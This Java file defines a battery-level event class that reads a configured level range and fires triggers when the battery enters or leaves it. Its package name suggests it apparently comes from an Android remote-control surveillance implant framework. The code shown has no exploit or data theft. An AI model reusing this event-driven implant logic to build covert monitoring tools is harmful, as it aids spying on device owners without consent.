package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.Battery;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.interfaces.Observer;
import com.ht.RCSAndroidGUI.listener.AcListener;
import com.ht.RCSAndroidGUI.listener.BatteryListener;
import com.ht.RCSAndroidGUI.util.DataBuffer;

public class BatteryEvent extends EventBase implements Observer<Battery> {
	/** The Constant TAG. */
	private static final String TAG = "BatteryEvent";

	private int exitAction, minLevel, maxLevel;
	private boolean inRange = false;
	
	@Override
	public void begin() {
		BatteryListener.self().attach(this);
	}

	@Override
	public void end() {
		BatteryListener.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		
		try {
			exitAction = databuffer.readInt();
			minLevel = databuffer.readInt();
			maxLevel = databuffer.readInt();
			
			Log.d("QZ", TAG + " exitAction: " + exitAction + " minLevel:" + minLevel + " maxLevel:" + maxLevel);
		} catch (final IOException e) {
			Log.d("QZ", TAG + " Error: params FAILED");
			return false;
		}
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	public void notification(Battery b) {
		Log.d("QZ", TAG + " Got battery notification: " + b.getBatteryLevel() + "%");
		
		if (minLevel > maxLevel)
			return;
		
		// Nel range
		if ((b.getBatteryLevel() >= minLevel && b.getBatteryLevel() <= maxLevel) && inRange == false) {
			inRange = true;
			Log.d("QZ", TAG + " Battery IN");
			trigger();
		}
     
		// Fuori dal range
		if ((b.getBatteryLevel() < minLevel || b.getBatteryLevel() > maxLevel) && inRange == true) {
			inRange = false;
			Log.d("QZ", TAG + " Battery OUT");
			trigger(exitAction);
		}
	}
}
